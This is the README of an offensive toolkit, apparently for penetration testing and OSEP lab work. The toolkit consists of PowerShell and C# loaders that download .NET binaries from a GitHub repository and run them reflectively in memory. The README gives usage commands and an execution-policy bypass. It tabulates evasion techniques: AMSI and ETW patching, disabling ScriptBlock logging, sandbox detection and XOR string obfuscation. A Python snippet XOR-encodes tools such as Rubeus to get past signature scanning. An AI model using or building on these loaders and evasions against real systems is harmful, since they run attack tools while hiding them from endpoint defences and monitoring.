# Loaders

In-memory .NET assembly loaders for authorized penetration testing / OSEP lab use.

---

## Load-RemoteTool.ps1 (PowerShell)

Single-file PowerShell loader. Patches AMSI, queries the GitHub Contents API, presents
a numbered menu, downloads the selected binary as raw bytes, and reflectively invokes
its `Main` method — nothing touches disk.

### Quick start

```powershell
# Default repo (Syslifters/offsec-tools/bin)
.\Load-RemoteTool.ps1

# Custom repo
.\Load-RemoteTool.ps1 -RepoOwner YourOrg -RepoName your-tools -SubFolder bin

# Private repo / avoid rate limits
.\Load-RemoteTool.ps1 -RepoOwner YourOrg -RepoName your-tools -SubFolder bin -Token ghp_xxxx
```

If execution policy blocks it:

```powershell
powershell -ep bypass -File .\Load-RemoteTool.ps1
```

---

## RemoteLoader.exe (C#)

Compiled .NET binary. Same capabilities as the PowerShell version.

### Compilation

**With csc.exe (Framework 4.7.2)**

```cmd
csc /target:exe /out:RemoteLoader.exe RemoteLoader\RemoteLoader.cs
```

Requires the .NET Framework 4.7.2 developer pack and `csc` in `PATH`
(usually `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe`).

**With dotnet SDK (recommended)**

```cmd
cd RemoteLoader
dotnet build -c Release
# Output: RemoteLoader\bin\Release\net472\RemoteLoader.exe
```

Or produce a self-contained single-file exe (net6.0 target — edit the csproj first):

```cmd
dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true
```

### Usage

```
RemoteLoader.exe [--repo owner/name/subfolder] [--token <PAT>]

Options:
  --repo   GitHub path  (default: Syslifters/offsec-tools/bin)
  --token  GitHub PAT for private repos or to avoid rate limits
  --help   Show help
```

Examples:

```cmd
RemoteLoader.exe
RemoteLoader.exe --repo YourOrg/your-tools/bin
RemoteLoader.exe --repo YourOrg/private-tools/bin --token ghp_xxxx
```

---

## Evasion stack (both tools)

| Layer | Technique | Detail |
|---|---|---|
| ScriptBlock logging | Reflection | PS only — disables Event ID 4104 before any block is logged |
| AMSI | Reflection (primary) | Sets `amsiInitFailed = true` via reflection; no `Add-Type`, no disk artifact |
| AMSI | P/Invoke fallback | Patches `AmsiScanBuffer`; sensitive strings XOR-decoded at runtime only |
| ETW | `EtwEventWrite` patch | Single `RET` suppresses all .NET CLR telemetry events |
| Sandbox | Uptime + process count | Exits silently if uptime < 3 min or < 15 processes |
| String obfuscation | XOR key `0x41` | `amsi.dll`, `AmsiScanBuffer`, `ntdll.dll`, `EtwEventWrite` never appear as plaintext |
| Payload encoding | XOR (optional) | Store binaries XOR-encoded in your repo; decode in memory before `Assembly.Load` |
| Network | TLS 1.2 + system proxy | Ensures connectivity through corporate proxies; explicit TLS 1.2 for .NET 4.x |

## XOR-encoding your tools for the repo

If you control the repo, encode your binaries before uploading to defeat byte-level static signatures:

```python
# encode.py
key = 0x41
with open("Rubeus.exe","rb") as f: data = f.read()
with open("Rubeus.exe.enc","wb") as f: f.write(bytes(b ^ key for b in data))
```

Then load with:
```powershell
.\Load-RemoteTool.ps1 -XorKey 0x41
```
```cmd
RemoteLoader.exe --xor 65
```

## Notes

- Both tools require internet to list and download. After download, no further external calls.
- Tools whose `Main` does not accept `string[]` are invoked without arguments.
- Pass `--help` / `-h` to `RemoteLoader.exe` for usage.
